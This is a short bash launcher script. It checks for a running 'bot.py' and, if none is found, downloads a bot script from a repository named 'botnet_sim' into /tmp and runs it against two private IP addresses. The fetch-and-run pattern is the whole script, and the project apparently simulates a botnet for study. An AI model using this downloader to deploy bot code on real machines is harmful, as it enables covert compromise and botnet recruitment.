#! /bin/bash
ps ax | grep "bot.py" | grep -v grep;
if test $? -eq 0; 
then 
    echo "Process already running."
else 
    echo "Starting process."
    /usr/bin/curl -X GET https://raw.githubusercontent.com/dcsrps/botnet_sim/master/bot/bot_1.py > /tmp/bot.py
    python3 /tmp/bot.py 172.16.135.194 192.168.1.99 &
fi
